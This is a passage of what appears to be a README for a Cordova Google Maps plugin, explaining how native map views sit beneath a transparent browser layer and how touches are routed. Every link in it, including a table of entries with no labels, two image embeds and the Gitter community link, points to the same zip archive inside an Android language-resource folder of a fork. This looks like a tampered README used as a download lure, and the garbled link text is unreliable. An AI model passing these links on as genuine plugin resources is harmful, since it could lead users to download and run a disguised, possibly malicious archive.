| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip                  | (not available)                       |
| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip     | (not available)                       |
| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip | (not available)                       |
| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip          | (not available)                       |
| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip*              | (not available)                       |
| https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip*       | (not available)                       |

### How does this plugin work (Android, iOS)?

This plugin generates native map views, and puts them **under the browser**.

The map views are not HTML elements. This means that they are not a `<div>` or anything HTML related.
But you can specify the size and position of the map view using its containing `<div>`.

This plugin changes the background to `transparent` in your application.
Then the plugin detects your touch position, which is either meant for the `native map` or an `html element`
(which can be on top of your map, or anywhere else on the screen).

![](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)

The benefit of this plugin is the ability to automatically detect which HTML elements are over the map or not.

For instance, in the image below, say you tap on the header div (which is over the map view).
The plugin will detect whether your tap is for the header div or for the map view and then pass the touch event appropriately.

This means **you can use the native Google Maps views similar to HTML elements**.

![](https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip)


---------------------------------------------------------------------------------------------------------
## Official Communities

- Gitter : (managed by @Hirbod)

  https://github.com/iwanariana/cordova-plugin-googlemaps/raw/refs/heads/master/src/android/res/values-fr/cordova_plugin_googlemaps_v2.5.zip
